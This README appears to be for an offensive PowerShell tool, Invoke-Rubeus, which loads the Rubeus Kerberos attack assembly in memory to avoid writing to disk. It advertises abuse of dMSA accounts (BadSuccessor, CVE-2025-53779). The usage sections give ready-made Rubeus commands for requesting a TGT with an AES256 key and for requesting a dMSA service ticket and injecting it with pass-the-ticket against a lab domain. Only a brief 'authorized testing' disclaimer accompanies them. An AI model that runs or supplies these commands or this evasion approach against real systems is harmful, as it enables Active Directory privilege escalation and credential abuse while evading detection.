## Invoke-Rubeus PR — Reflective In-Memory Loader for Rubeus

Invoke-Rubeus is a PowerShell function that loads a compressed .NET assembly entirely in memory, decompresses it, and executes its managed Main() entry point without ever touching disk.

This version uses a Rubeus Pull Request that enables the use of dMSA accounts (https://github.com/GhostPack/Rubeus/pull/194).

This design is useful for:

  Executing a .NET assembly in-memory


## Features
- In-memory execution
Loads and runs any .NET assembly without dropping files.
- dMSA (BadSuccessor - CVE-2025-53779)

## Usage
## Common Rubeus Commands
```
Invoke-Rubeus -Command "asktgt /user:Pwn$ /aes256:<SNIP> /domain:hacklabs.local /nowrap"
```

## dMSA TGS Request
```
Invoke-Rubeus -Command "asktgs /targetuser:attacker_dMSA$ /service:krbtgt/hacklabs.local /dmsa /opsec /ptt /nowrap /outfile:c:\Users\b5null\Desktop\ticket.kirbi /ticket:<base64 encoded TGT>
```

## ⚠️ Disclaimer

I do not own Rubeus nor the PR. Rubeus was developed by GhostPack (https://github.com/ghostpack) and the PR by JoeDibley - https://github.com/JoeDibley

For educational and authorized testing only. Use only with explicit permission. The authors assume no liability for misuse.

## Author
💀 B5null

